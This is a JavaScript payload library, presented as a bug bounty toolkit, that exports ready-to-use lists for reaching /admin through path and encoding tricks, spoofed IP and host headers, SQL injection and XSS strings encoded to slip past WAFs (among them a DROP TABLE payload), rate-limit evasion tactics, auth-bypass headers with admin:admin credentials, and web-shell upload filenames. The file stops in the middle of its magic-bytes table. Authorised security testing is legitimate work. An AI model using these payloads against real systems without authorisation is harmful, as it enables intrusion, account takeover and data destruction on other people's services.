// Bypass Techniques - Bug Bounty Toolkit
// Comprehensive bypass payloads for professional bug bounty hunting
// Includes path manipulation, WAF bypass, rate limiting, auth bypass, and more

/**
 * ADMIN_PATH_BYPASS - 100+ path manipulation payloads to bypass /admin access
 * Used when direct access to /admin returns 403/401
 */
export const ADMIN_PATH_BYPASS = [
  // Case Manipulation
  '/Admin', '/ADMIN', '/aDmin', '/adMin', '/admIn', '/admiN',
  '/ADmin', '/ADMin', '/ADMIn', '/ADMI', '/admin/',
  
  // Path Traversal Tricks
  '/admin/..;/', '/admin..;/', '//admin', '///admin',
  '/./admin', '/.//admin', '/admin/.', '/admin/./.',
  '/admin/..;/admin', '/%2f/admin', '/%2fadmin',
  '/admin%20', '/admin%09', '/admin%0a', '/admin%0d',
  '/admin%00', '/admin%00.json', '/admin%00.html',
  
  // URL Encoding
  '/%61dmin', '/%61%64min', '/%61%64%6din', '/%61%64%6d%69n',
  '/%61%64%6d%69%6e', '/adm%69n', '/ad%6din', '/a%64min',
  
  // Double URL Encoding
  '/%2561dmin', '/%2561%2564min', '/%2561%2564%256din',
  '/admin%252f', '/admin%252e', '/%252fadmin',
  
  // Unicode/UTF-8 Encoding
  '/adm\u0069n', '/admi\u006e', '/\u0061dmin',
  '/admin\uff0f', '/\uff0fadmin', '/admin\u2025',
  
  // Path Normalization
  '/admin/', '/admin//', '/admin///', '//admin//',
  '/admin/./', '/admin/.//', '/./admin/./',
  '/admin/../admin', '/admin/../admin/', '/anything/../admin',
  '/admin/..%2f..%2fadmin', '/admin/..%252f..%252fadmin',
  
  // Semicolon & Parameter Tricks
  '/admin;/', '/admin;.css', '/admin;.js', '/admin;.html',
  '/admin;.json', '/admin;.xml', '/admin;.png', '/admin;.ico',
  '/admin;x=1', '/admin;a=b/', '/admin..;/index',
  
  // Extension Tricks
  '/admin.html', '/admin.php', '/admin.asp', '/admin.aspx',
  '/admin.jsp', '/admin.json', '/admin.xml', '/admin.css',
  '/admin.js', '/admin.ico', '/admin.png', '/admin.jpg',
  '/admin.gif', '/admin.svg', '/admin.woff', '/admin.txt',
  '/admin.pdf', '/admin.do', '/admin.action', '/admin.xhtml',
  
  // HTTP Parameter Pollution
  '/admin?', '/admin??', '/admin???', '/admin#', '/admin##',
  '/admin?x=', '/admin?x=1', '/admin?debug=1', '/admin?test=1',
  '/admin?admin=true', '/admin?role=admin', '/admin?access=1',
  
  // Verb Tunneling with Path
  '/admin', '/admin/', '/admin/index', '/admin/index.html',
  '/admin/index.php', '/admin/dashboard', '/admin/home',
  '/admin/panel', '/admin/console', '/admin/portal',
  '/admin/login', '/admin/cp', '/admin/controlpanel',
  
  // Wildcard & Glob
  '/admin*', '/admin%2a', '/adm?n', '/adm%3fn',
  '/admin[0]', '/admin[]', '/admin{}',
  
  // Backslash Tricks (IIS)
  '/admin\\', '\\admin', '/admin\\..\\admin',
  '/admin\\./', '/admin\\./\\', '/admin%5c',
  '/%5cadmin', '/admin%5c..%5cadmin',
  
  // Tab & Special Characters
  '/admin\t', '/admin\n', '/admin\r', '/admin\r\n',
  '/admin%09', '/admin%0a', '/admin%0d', '/admin%0d%0a',
  '/admin%20/', '/ admin', '/admin /', '/\tadmin',
  
  // Dot Tricks
  '/admin.', '/admin..', '/admin...', '/.admin',
  '/..admin', '/admin./', '/admin../', '/admin.../.',
  
  // Mixed Techniques
  '/ADMIN/..;/admin', '/%61dmin/..;/', '/admin/..;/ADMIN',
  '/admin%23', '/admin%3f', '/admin%26', '/admin%3b',
  '/admin/~', '/~admin', '/admin/~admin',
  '/api/admin', '/api/v1/admin', '/internal/admin',
  '/private/admin', '/secret/admin', '/hidden/admin',
];

/**
 * FORBIDDEN_403_BYPASS - 80+ techniques to bypass 403 Forbidden responses
 */
export const FORBIDDEN_403_BYPASS = [
  // Header-based bypasses (add these headers to the request)
  { header: 'X-Original-URL', value: '/admin' },
  { header: 'X-Rewrite-URL', value: '/admin' },
  { header: 'X-Override-URL', value: '/admin' },
  { header: 'X-Custom-IP-Authorization', value: '127.0.0.1' },
  { header: 'X-Forwarded-For', value: '127.0.0.1' },
  { header: 'X-Forwarded-For', value: '10.0.0.1' },
  { header: 'X-Forwarded-For', value: '172.16.0.1' },
  { header: 'X-Forwarded-For', value: '192.168.0.1' },
  { header: 'X-Forwarded-Host', value: 'localhost' },
  { header: 'X-Forwarded-Host', value: '127.0.0.1' },
  { header: 'X-Host', value: 'localhost' },
  { header: 'X-Host', value: '127.0.0.1' },
  { header: 'X-Remote-IP', value: '127.0.0.1' },
  { header: 'X-Remote-Addr', value: '127.0.0.1' },
  { header: 'X-ProxyUser-Ip', value: '127.0.0.1' },
  { header: 'X-Originating-IP', value: '127.0.0.1' },
  { header: 'X-Real-IP', value: '127.0.0.1' },
  { header: 'X-Client-IP', value: '127.0.0.1' },
  { header: 'True-Client-IP', value: '127.0.0.1' },
  { header: 'Cluster-Client-IP', value: '127.0.0.1' },
  { header: 'CF-Connecting-IP', value: '127.0.0.1' },
  { header: 'Fastly-Client-IP', value: '127.0.0.1' },
  { header: 'X-Cluster-Client-IP', value: '127.0.0.1' },
  { header: 'X-Forwarded', value: '127.0.0.1' },
  { header: 'Forwarded-For', value: '127.0.0.1' },
  { header: 'Forwarded', value: 'for=127.0.0.1' },
  { header: 'Via', value: '1.1 localhost' },
  { header: 'X-Forwarded-Port', value: '443' },
  { header: 'X-Forwarded-Port', value: '4443' },
  { header: 'X-Forwarded-Port', value: '80' },
  { header: 'X-Forwarded-Port', value: '8080' },
  { header: 'X-Forwarded-Port', value: '8443' },
  { header: 'X-Forwarded-Scheme', value: 'https' },
  { header: 'X-Forwarded-Proto', value: 'https' },
  { header: 'Content-Length', value: '0' },
  { header: 'Referer', value: 'https://TARGET/admin' },
  { header: 'X-Requested-With', value: 'XMLHttpRequest' },
  
  // Method-based bypasses
  { method: 'GET' },
  { method: 'POST' },
  { method: 'PUT' },
  { method: 'DELETE' },
  { method: 'PATCH' },
  { method: 'HEAD' },
  { method: 'OPTIONS' },
  { method: 'TRACE' },
  { method: 'CONNECT' },
  { method: 'PROPFIND' },
  { method: 'MOVE' },
  { method: 'COPY' },
  { method: 'LOCK' },
  { method: 'UNLOCK' },
  { method: 'MKCOL' },
  { method: 'SEARCH' },
  { method: 'PURGE' },
  { method: 'LINK' },
  { method: 'UNLINK' },
  { method: 'VIEW' },
  
  // Path manipulation bypasses
  { path: '/admin/' },
  { path: '/admin/.' },
  { path: '//admin' },
  { path: '/admin..;/' },
  { path: '/admin;/' },
  { path: '/admin/..;/' },
  { path: '/.;/admin' },
  { path: '/;/admin' },
  { path: '/admin%20' },
  { path: '/admin%09' },
  { path: '/admin%00' },
  { path: '/admin.json' },
  { path: '/admin.css' },
  { path: '/admin.html' },
  { path: '/admin?anything' },
  { path: '/admin#' },
  { path: '/admin/*' },
  { path: '/admin.php' },
  { path: '/%2e/admin' },
  { path: '/admin%2f' },
  { path: '/admin/~' },
  { path: '/admin/.randomfile' },
  
  // Protocol-based bypasses
  { protocol: 'HTTP/1.0' },
  { protocol: 'HTTP/0.9' },
  { protocol: 'HTTP/2' },
];

/**
 * HEADER_BYPASS - Headers with values for IP spoofing, host override, etc.
 */
export const HEADER_BYPASS = {
  // IP Spoofing Headers
  ip_spoofing: [
    { header: 'X-Forwarded-For', values: ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1', '0.0.0.0', '::1', 'localhost', '2130706433', '0x7f000001', '017700000001'] },
    { header: 'X-Real-IP', values: ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1'] },
    { header: 'X-Client-IP', values: ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1'] },
    { header: 'X-Remote-IP', values: ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1'] },
    { header: 'X-Remote-Addr', values: ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1'] },
    { header: 'X-Originating-IP', values: ['127.0.0.1', '[127.0.0.1]', '10.0.0.1'] },
    { header: 'X-Forwarded', values: ['127.0.0.1', 'for=127.0.0.1', 'for="127.0.0.1"'] },
    { header: 'Forwarded-For', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'Forwarded', values: ['for=127.0.0.1', 'for=10.0.0.1', 'for="[::1]"'] },
    { header: 'True-Client-IP', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'Cluster-Client-IP', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'X-Cluster-Client-IP', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'CF-Connecting-IP', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'Fastly-Client-IP', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'X-ProxyUser-Ip', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'X-Custom-IP-Authorization', values: ['127.0.0.1', '10.0.0.1'] },
    { header: 'X-Original-Forwarded-For', values: ['127.0.0.1'] },
    { header: 'X-Azure-ClientIP', values: ['127.0.0.1'] },
    { header: 'X-Azure-SocketIP', values: ['127.0.0.1'] },
    { header: 'Proxy-Client-IP', values: ['127.0.0.1'] },
    { header: 'WL-Proxy-Client-IP', values: ['127.0.0.1'] },
    { header: 'HTTP_X_FORWARDED_FOR', values: ['127.0.0.1'] },
    { header: 'HTTP_X_FORWARDED', values: ['127.0.0.1'] },
    { header: 'HTTP_CLIENT_IP', values: ['127.0.0.1'] },
    { header: 'HTTP_FORWARDED_FOR', values: ['127.0.0.1'] },
    { header: 'HTTP_FORWARDED', values: ['127.0.0.1'] },
    { header: 'HTTP_VIA', values: ['127.0.0.1'] },
    { header: 'REMOTE_ADDR', values: ['127.0.0.1'] },
  ],
  
  // Host Override Headers
  host_override: [
    { header: 'Host', values: ['localhost', '127.0.0.1', 'internal.target.com', 'admin.target.com'] },
    { header: 'X-Host', values: ['localhost', '127.0.0.1', 'internal.target.com'] },
    { header: 'X-Forwarded-Host', values: ['localhost', '127.0.0.1', 'evil.com'] },
    { header: 'X-Original-Host', values: ['localhost', '127.0.0.1'] },
    { header: 'X-Forwarded-Server', values: ['localhost', '127.0.0.1'] },
    { header: 'X-HTTP-Host-Override', values: ['localhost', '127.0.0.1'] },
    { header: 'X-Forwarded-For-Original', values: ['localhost'] },
    { header: 'Forwarded', values: ['host=localhost', 'host=127.0.0.1'] },
    { header: 'X-Backend-Host', values: ['localhost', '127.0.0.1'] },
    { header: 'X-Proxy-Host', values: ['localhost', '127.0.0.1'] },
  ],
  
  // URL Override Headers
  url_override: [
    { header: 'X-Original-URL', values: ['/admin', '/internal', '/debug', '/api/admin'] },
    { header: 'X-Rewrite-URL', values: ['/admin', '/internal', '/debug', '/api/admin'] },
    { header: 'X-Override-URL', values: ['/admin', '/internal', '/debug'] },
    { header: 'X-Proxy-URL', values: ['/admin', '/internal'] },
    { header: 'Request-Uri', values: ['/admin', '/internal'] },
    { header: 'X-Original-URI', values: ['/admin', '/internal'] },
  ],
  
  // Protocol & Port Override
  protocol_override: [
    { header: 'X-Forwarded-Proto', values: ['https', 'http'] },
    { header: 'X-Forwarded-Scheme', values: ['https', 'http'] },
    { header: 'X-Forwarded-Protocol', values: ['https', 'http'] },
    { header: 'X-Forwarded-Ssl', values: ['on', 'off'] },
    { header: 'X-Forwarded-Port', values: ['443', '80', '8080', '8443', '4443', '9443'] },
    { header: 'X-URL-Scheme', values: ['https', 'http'] },
    { header: 'Front-End-Https', values: ['on', 'off'] },
  ],
  
  // Content Negotiation
  content_negotiation: [
    { header: 'Accept', values: ['application/json', 'text/html', 'application/xml', '*/*', 'text/plain'] },
    { header: 'Content-Type', values: ['application/json', 'application/xml', 'text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data'] },
    { header: 'Accept-Encoding', values: ['gzip', 'deflate', 'br', 'identity', '*'] },
    { header: 'Accept-Language', values: ['en', 'en-US', '*', 'fr', 'de', 'ja'] },
  ],
};

/**
 * WAF_BYPASS_ENCODINGS - Encoding chains for WAF bypass
 */
export const WAF_BYPASS_ENCODINGS = {
  // URL Encoding
  url_encode: {
    description: 'Standard URL encoding',
    encode: (str) => encodeURIComponent(str),
    examples: ["' OR 1=1--", '%27%20OR%201%3D1--'],
  },
  
  // Double URL Encoding
  double_url_encode: {
    description: 'Double URL encoding to bypass single-decode WAFs',
    encode: (str) => encodeURIComponent(encodeURIComponent(str)),
    examples: ["' OR 1=1--", '%2527%2520OR%25201%253D1--'],
  },
  
  // Triple URL Encoding
  triple_url_encode: {
    description: 'Triple URL encoding for multi-layer proxies',
    encode: (str) => encodeURIComponent(encodeURIComponent(encodeURIComponent(str))),
  },
  
  // Unicode Encoding
  unicode: {
    description: 'Unicode character encoding',
    payloads: [
      "\\u0027 OR 1=1--",
      "\\u003cscript\\u003e",
      "%u0027%u0020OR%u00201%u003d1--",
      "%uff07 OR 1=1--",
      "＇ OR 1=1--",  // Fullwidth apostrophe
    ],
  },
  
  // Hex Encoding
  hex: {
    description: 'Hexadecimal encoding',
    payloads: [
      "0x27204f5220313d312d2d",  // ' OR 1=1--
      "\\x27\\x20OR\\x201=1--",
      "&#x27; OR 1=1--",
      "&#x3c;script&#x3e;",
    ],
  },
  
  // Octal Encoding
  octal: {
    description: 'Octal encoding',
    payloads: [
      "\\047 OR 1=1--",
      "\\074script\\076",
      "\\047\\040OR\\0401=1--",
    ],
  },
  
  // HTML Entity Encoding
  html_entity: {
    description: 'HTML entity encoding (named and numeric)',
    payloads: [
      "&#39; OR 1=1--",
      "&#x27; OR 1=1--",
      "&apos; OR 1=1--",
      "&#60;script&#62;alert(1)&#60;/script&#62;",
      "&lt;script&gt;alert(1)&lt;/script&gt;",
      "&#0000060;script&#0000062;",
      "&#x0003c;script&#x0003e;",
    ],
  },
  
  // Base64 Encoding
  base64: {
    description: 'Base64 encoding',
    payloads: [
      "JyBPUiAxPTEtLQ==",  // ' OR 1=1--
      "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  // <script>alert(1)</script>
    ],
  },
  
  // Mixed Case
  mixed_case: {
    description: 'Mixed case to bypass case-sensitive filters',
    payloads: [
      "sElEcT", "SeLeCt", "SELECT", "select",
      "uNiOn", "UnIoN", "UNION", "union",
      "ScRiPt", "sCrIpT", "SCRIPT", "script",
      "AlErT", "aLeRt", "ALERT", "alert",
      "OnErRoR", "oNeRrOr", "ONERROR", "onerror",
    ],
  },
  
  // Comment Injection (SQL)
  sql_comments: {
    description: 'SQL comment-based bypass',
    payloads: [
      "/**/OR/**/1=1--",
      "/*!50000OR*/1=1--",
      "/**/UN/**/ION/**/SE/**/LECT/**/",
      "UN/**/ION/**/SEL/**/ECT",
      "1'/**/OR/**/1=1--",
      "' /*!50000OR*/ 1=1--",
      "/*!32302 1=1*/--",
      "' /*!00000union*//*!00000select*/ 1,2,3--",
      "/*!union*/+/*!select*/",
      "un%69on sel%65ct",
      "/**/union/**/select/**/",
      "/**/;/**/DROP/**/TABLE/**/users--",
    ],
  },
  
  // Whitespace Alternatives
  whitespace: {
    description: 'Alternative whitespace characters',
    characters: [
      '%09',  // Tab
      '%0a',  // Newline
      '%0b',  // Vertical tab
      '%0c',  // Form feed
      '%0d',  // Carriage return
      '%20',  // Space
      '%a0',  // Non-breaking space
      '+',    // Plus (URL space)
      '/**/', // SQL comment as space
      '%00',  // Null byte
      '(',    // Parenthesis (SQL)
      ')',    // Parenthesis (SQL)
    ],
    payloads: [
      "'%09OR%091=1--",
      "'%0aOR%0a1=1--",
      "'%0bOR%0b1=1--",
      "'%0cOR%0c1=1--",
      "'%0dOR%0d1=1--",
      "'+OR+1=1--",
      "'%a0OR%a01=1--",
    ],
  },
  
  // String Concatenation
  concatenation: {
    description: 'String concatenation to split keywords',
    payloads: [
      // MySQL
      "CONCAT('sel','ect')",
      "'con'+'cat'",
      "0x73656c656374",  // select in hex
      
      // MSSQL
      "'sel'+'ect'",
      "EXEC('sel'+'ect 1')",
      
      // Oracle
      "'sel'||'ect'",
      "CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116)",
      
      // PostgreSQL
      "$$select$$",
      "$tag$select$tag$",
      "CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116)",
    ],
  },
  
  // XSS Encoding Bypasses
  xss_encodings: {
    description: 'XSS payload encoding variations',
    payloads: [
      '<script>alert(1)</script>',
      '<ScRiPt>alert(1)</ScRiPt>',
      '<script/x>alert(1)</script>',
      '<script\\x20>alert(1)</script>',
      '<script\\x09>alert(1)</script>',
      '<script\\x0a>alert(1)</script>',
      '<script\\x0d>alert(1)</script>',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<img src=x onerror=alert(1)>',
      '<img/src=x onerror=alert(1)>',
      '<img\\tsrc=x\\tonerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<keygen onfocus=alert(1) autofocus>',
      '<iframe src="javascript:alert(1)">',
      '<iframe srcdoc="<script>alert(1)</script>">',
      '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
      'javascript:alert(1)',
      'jaVasCript:alert(1)',
      'java%0ascript:alert(1)',
      'java%09script:alert(1)',
      'java%0dscript:alert(1)',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
      '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
    ],
  },
  
  // Null Byte Injection
  null_byte: {
    description: 'Null byte injection for filter bypass',
    payloads: [
      '%00', '\\x00', '\\0', '\\u0000',
      "admin%00.jpg",
      "file.php%00.jpg",
      "..%00/etc/passwd",
      "test%00<script>alert(1)</script>",
    ],
  },
  
  // Overlong UTF-8
  overlong_utf8: {
    description: 'Overlong UTF-8 encoding',
    payloads: [
      '%c0%af',  // / (slash)
      '%c0%ae',  // . (dot)
      '%c1%9c',  // \\ (backslash)
      '%c0%2f',  // / alternative
      '%e0%80%af',  // / (3-byte overlong)
      '%f0%80%80%af',  // / (4-byte overlong)
    ],
  },
};

/**
 * RATE_LIMIT_BYPASS - 30+ techniques to bypass rate limiting
 */
export const RATE_LIMIT_BYPASS = [
  // IP-based bypasses
  {
    technique: 'X-Forwarded-For rotation',
    description: 'Rotate IP in X-Forwarded-For header each request',
    headers: { 'X-Forwarded-For': 'RANDOM_IP' },
  },
  {
    technique: 'X-Real-IP rotation',
    description: 'Rotate IP in X-Real-IP header',
    headers: { 'X-Real-IP': 'RANDOM_IP' },
  },
  {
    technique: 'X-Client-IP rotation',
    description: 'Rotate IP in X-Client-IP header',
    headers: { 'X-Client-IP': 'RANDOM_IP' },
  },
  {
    technique: 'X-Originating-IP rotation',
    description: 'Rotate IP in X-Originating-IP header',
    headers: { 'X-Originating-IP': 'RANDOM_IP' },
  },
  {
    technique: 'True-Client-IP rotation',
    description: 'Rotate IP in True-Client-IP header',
    headers: { 'True-Client-IP': 'RANDOM_IP' },
  },
  {
    technique: 'Multiple X-Forwarded-For values',
    description: 'Add multiple IPs in X-Forwarded-For',
    headers: { 'X-Forwarded-For': 'RANDOM_IP, RANDOM_IP2, RANDOM_IP3' },
  },
  
  // Endpoint manipulation
  {
    technique: 'Path case variation',
    description: 'Change URL case: /api/login vs /API/LOGIN vs /Api/Login',
  },
  {
    technique: 'Path parameter addition',
    description: 'Add random parameters: /api/login?x=1, /api/login?x=2',
  },
  {
    technique: 'Path trailing slash',
    description: 'Toggle trailing slash: /api/login vs /api/login/',
  },
  {
    technique: 'Path double slash',
    description: 'Add double slashes: //api//login',
  },
  {
    technique: 'Path encoding',
    description: 'URL encode path: /api/%6cogin, /api/l%6fgin',
  },
  {
    technique: 'Path dot insertion',
    description: 'Insert dots: /api/./login, /api/login/.',
  },
  {
    technique: 'Path semicolon',
    description: 'Add semicolons: /api/login;x=1',
  },
  {
    technique: 'HTTP version downgrade',
    description: 'Use HTTP/1.0 instead of HTTP/1.1',
  },
  
  // Request manipulation
  {
    technique: 'Method switching',
    description: 'Switch between GET/POST/PUT for same endpoint',
  },
  {
    technique: 'Content-Type switching',
    description: 'Switch between JSON/form-data/XML',
  },
  {
    technique: 'Add null bytes in parameters',
    description: 'Add %00 in parameter values to create unique requests',
  },
  {
    technique: 'Unicode character insertion',
    description: 'Add invisible unicode chars in parameters',
  },
  {
    technique: 'Parameter pollution',
    description: 'Duplicate parameters: ?user=admin&user=admin',
  },
  {
    technique: 'Array parameter notation',
    description: 'Use array notation: user[]=admin, user[0]=admin',
  },
  
  // Token/Session manipulation
  {
    technique: 'Cookie rotation',
    description: 'Rotate session cookies between requests',
  },
  {
    technique: 'Token regeneration',
    description: 'Get new CSRF/auth token for each request',
  },
  {
    technique: 'Anonymous session',
    description: 'Remove all cookies/tokens to appear as new user',
  },
  
  // Timing-based
  {
    technique: 'Slow request spacing',
    description: 'Space requests just under the rate limit window',
  },
  {
    technique: 'Burst then wait',
    description: 'Send burst of requests then wait for window reset',
  },
  {
    technique: 'Distributed timing',
    description: 'Distribute requests across rate limit windows',
  },
  
  // Infrastructure
  {
    technique: 'IPv4 vs IPv6',
    description: 'Switch between IPv4 and IPv6 addresses',
  },
  {
    technique: 'Different API versions',
    description: 'Try /v1/login, /v2/login, /v3/login',
  },
  {
    technique: 'Mobile vs Desktop endpoints',
    description: 'Try /api/mobile/login vs /api/login',
  },
  {
    technique: 'Subdomain variation',
    description: 'Try api.target.com vs www.target.com/api',
  },
  {
    technique: 'Origin header manipulation',
    description: 'Change Origin header to bypass CORS-based rate limits',
  },
  {
    technique: 'User-Agent rotation',
    description: 'Rotate User-Agent strings between requests',
  },
  {
    technique: 'Accept-Language variation',
    description: 'Change Accept-Language header each request',
  },
  {
    technique: 'Race condition',
    description: 'Send multiple requests simultaneously before rate limit kicks in',
  },
];

/**
 * AUTH_BYPASS_HEADERS - 30+ headers for authentication bypass
 */
export const AUTH_BYPASS_HEADERS = [
  // Admin/Internal Access Headers
  { header: 'X-Custom-IP-Authorization', value: '127.0.0.1' },
  { header: 'X-Original-URL', value: '/admin' },
  { header: 'X-Rewrite-URL', value: '/admin' },
  { header: 'X-Override-URL', value: '/admin' },
  { header: 'X-Forwarded-For', value: '127.0.0.1' },
  { header: 'X-Remote-IP', value: '127.0.0.1' },
  { header: 'X-Client-IP', value: '127.0.0.1' },
  { header: 'X-Real-IP', value: '127.0.0.1' },
  { header: 'X-Forwarded-Host', value: 'localhost' },
  { header: 'X-Host', value: 'localhost' },
  
  // Role/Permission Headers
  { header: 'X-User-Role', value: 'admin' },
  { header: 'X-Admin', value: 'true' },
  { header: 'X-Is-Admin', value: '1' },
  { header: 'X-Role', value: 'administrator' },
  { header: 'X-Permission', value: 'admin' },
  { header: 'X-Access-Level', value: 'admin' },
  { header: 'X-User-Type', value: 'admin' },
  { header: 'X-Auth-Level', value: 'admin' },
  { header: 'X-Privilege', value: 'admin' },
  { header: 'X-Account-Type', value: 'admin' },
  
  // Authentication Headers
  { header: 'Authorization', value: 'Basic YWRtaW46YWRtaW4=' },  // admin:admin
  { header: 'Authorization', value: 'Bearer null' },
  { header: 'Authorization', value: 'Bearer undefined' },
  { header: 'Authorization', value: 'Bearer ' },
  { header: 'Authorization', value: 'Bearer admin' },
  { header: 'X-Auth-Token', value: 'admin' },
  { header: 'X-API-Key', value: 'admin' },
  { header: 'X-Access-Token', value: 'admin' },
  
  // Internal/Debug Headers
  { header: 'X-Debug', value: 'true' },
  { header: 'X-Internal', value: 'true' },
  { header: 'X-Backend', value: 'true' },
  { header: 'X-Bypass-Auth', value: 'true' },
  { header: 'X-Skip-Auth', value: 'true' },
  { header: 'X-No-Auth', value: 'true' },
  { header: 'X-Disable-Auth', value: 'true' },
  { header: 'X-Test', value: 'true' },
  { header: 'X-QA', value: 'true' },
  { header: 'X-Staging', value: 'true' },
  { header: 'X-Development', value: 'true' },
  { header: 'X-Environment', value: 'development' },
];

/**
 * HTTP_METHOD_BYPASS - All HTTP methods for method-based bypass
 */
export const HTTP_METHOD_BYPASS = [
  // Standard Methods
  'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS',
  'TRACE', 'CONNECT',
  
  // WebDAV Methods
  'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK',
  'UNLOCK', 'SEARCH', 'REPORT', 'MKACTIVITY', 'CHECKOUT',
  'MERGE', 'NOTIFY', 'SUBSCRIBE', 'UNSUBSCRIBE',
  
  // Non-standard Methods
  'PURGE', 'LINK', 'UNLINK', 'VIEW', 'QUERY',
  'ARBITRARY', 'TEST', 'DEBUG', 'TRACK',
  
  // Method Override Techniques
  { method: 'POST', headers: { 'X-HTTP-Method-Override': 'PUT' } },
  { method: 'POST', headers: { 'X-HTTP-Method-Override': 'DELETE' } },
  { method: 'POST', headers: { 'X-HTTP-Method-Override': 'PATCH' } },
  { method: 'POST', headers: { 'X-HTTP-Method': 'PUT' } },
  { method: 'POST', headers: { 'X-Method-Override': 'PUT' } },
  { method: 'GET', headers: { 'X-HTTP-Method-Override': 'POST' } },
  { method: 'POST', params: { '_method': 'PUT' } },
  { method: 'POST', params: { '_method': 'DELETE' } },
  { method: 'POST', params: { '_method': 'PATCH' } },
  { method: 'POST', params: { 'method': 'PUT' } },
  { method: 'POST', params: { 'http_method': 'PUT' } },
  { method: 'POST', params: { 'httpMethod': 'PUT' } },
];

/**
 * FILE_UPLOAD_BYPASS - 80+ extension tricks, content-type tricks, magic bytes
 */
export const FILE_UPLOAD_BYPASS = {
  // Extension Bypass Techniques
  extension_bypass: [
    // Double extensions
    'shell.php.jpg', 'shell.php.png', 'shell.php.gif', 'shell.php.pdf',
    'shell.php.txt', 'shell.php.html', 'shell.php.doc', 'shell.php.svg',
    'shell.asp.jpg', 'shell.aspx.png', 'shell.jsp.gif',
    
    // Null byte (older systems)
    'shell.php%00.jpg', 'shell.php%00.png', 'shell.php\\x00.jpg',
    'shell.asp%00.jpg', 'shell.aspx%00.png',
    
    // Case manipulation
    'shell.pHp', 'shell.PhP', 'shell.PHP', 'shell.Php',
    'shell.pHP', 'shell.phP', 'shell.pHp7',
    'shell.aSp', 'shell.AsPx', 'shell.jSp',
    
    // Alternative PHP extensions
    'shell.php3', 'shell.php4', 'shell.php5', 'shell.php7', 'shell.php8',
    'shell.pht', 'shell.phtml', 'shell.phps', 'shell.phar',
    'shell.pgif', 'shell.shtml', 'shell.inc',
    'shell.module', 'shell.profile', 'shell.install',
    
    // Alternative ASP extensions
    'shell.asp', 'shell.aspx', 'shell.asa', 'shell.cer', 'shell.cdx',
    'shell.ashx', 'shell.asmx', 'shell.ascx', 'shell.config',
    'shell.cshtml', 'shell.vbhtml',
    
    // Alternative JSP extensions
    'shell.jsp', 'shell.jspx', 'shell.jsw', 'shell.jsv', 'shell.jspf',
    'shell.war', 'shell.jar',
    
    // Other server-side extensions
    'shell.cgi', 'shell.pl', 'shell.py', 'shell.rb', 'shell.sh',
    'shell.bash', 'shell.bat', 'shell.cmd', 'shell.ps1',
    'shell.cfm', 'shell.cfml', 'shell.ssi',
    
    // Trailing characters
    'shell.php.', 'shell.php..', 'shell.php...', 'shell.php ',
    'shell.php%20', 'shell.php%0a', 'shell.php%0d%0a',
    'shell.php%09', 'shell.php;', 'shell.php;.jpg',
    'shell.php::$DATA', 'shell.php::$DATA.jpg',  // Windows ADS
    
    // Special characters in extension
    'shell.p.h.p', 'shell.p%68p', 'shell.ph%70',
    'shell.%70hp', 'shell.%70%68%70',
    
    // .htaccess / web.config upload
    '.htaccess', 'web.config', '.user.ini', 'php.ini',
  ],
  
  // Content-Type Bypass
  content_type_bypass: [
    // Image MIME types
    'image/jpeg', 'image/png', 'image/gif', 'image/svg+xml',
    'image/bmp', 'image/tiff', 'image/webp', 'image/x-icon',
    
    // Document MIME types
    'application/pdf', 'application/msword', 'text/plain',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'application/vnd.ms-excel', 'text/csv',
    
    // Generic types
    'application/octet-stream', 'application/x-httpd-php',
    'application/x-php', 'text/x-php', 'text/html',
    'application/xhtml+xml', 'application/xml', 'text/xml',
    
    // Multipart manipulation
    'multipart/form-data', 'multipart/mixed', 'multipart/related',
  ],
  
  // Magic Bytes (file signatures)
  magic_bytes: {
    jpeg: { hex: 'FF D8 FF E0', bytes: Buffer.from ? [0xFF, 0xD8, 0xFF, 0xE0] : 'ffd8ffe0' },
    png: { hex: '89 50 4E 47 0D 0A 1A 0A', bytes: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A] },
    gif87a: { hex: '47 49 46 38 37 61', bytes: [0x47, 0x49, 0x46, 0x38, 0x37, 0x61], string: 'GIF87a' },
    gif89a: { hex: '47 49 46 38 39 61', bytes: [0x47, 0x49, 0x46, 0x38, 0x39, 0x61], string: 'GIF89a' },
    bmp: { hex: '42 4D', bytes: [0x42, 0x4D], string: 'BM' },
    pdf: { hex: '25 50 44 46', bytes: [0x25, 0x50, 0x44, 0x46], string: '%PDF' },
    zip: { hex: '50 4B 03 04', bytes: [0x50, 0x4B, 0x03, 0x04] },
    rar: { hex: '52 61 72 21', bytes: [0x52, 0x61, 0x72, 0x21] },
    gzip: { hex: '1F 8B', bytes: [0x1F, 0x8B] },
